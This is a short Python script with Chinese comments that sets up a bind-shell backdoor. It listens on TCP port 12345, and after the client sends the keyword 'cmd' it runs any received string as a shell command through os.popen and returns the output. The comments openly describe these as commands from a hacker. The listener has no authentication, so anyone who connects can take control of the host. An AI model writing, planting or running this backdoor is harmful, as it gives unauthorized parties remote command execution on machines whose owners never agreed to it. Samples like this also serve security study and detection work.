# -*- coding: utf-8 -*-
"""
Created on Wed Apr  7 19:11:33 2021

@author: 15003
"""
import socket
import os
def main():
    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    host=socket.gethostname()
    port=12345
    s.bind((host,port))
    s.listen(5)
    
    while True:
        c,addr=s.accept()
        print("链接地址是：",addr)
        c.send("欢迎访问".encode("UTF-8"))
        while True:
            try:
                recv_data=c.recv(1024).decode("UTF-8")
                print(recv_data)
                if recv_data=="cmd":
                    while True:   #开始接收黑客命令
                        c.send("CMD START".encode('UTF-8'))
                        data=c.recv(1024)
                        recv_data2=data.decode("UTF-8")
                        if recv_data2=="exit":
                            c.send("CMD STOP".encode("UTF-8"))
                            break
                            c.close()
                        else:
                            x=os.popen(recv_data2).read()
                            c.send(x.encode("UTF-8"))  #把命令回显发送给黑客
                else:
                    c.send(recv_data.encode("UTF-8"))
            except Exception as e:
                print("断开连接")
                print(e)
                break
            
        c.close()  #断掉当前连接
    s.close()      #断掉服务器连接

if __name__=="__main__":
    main()       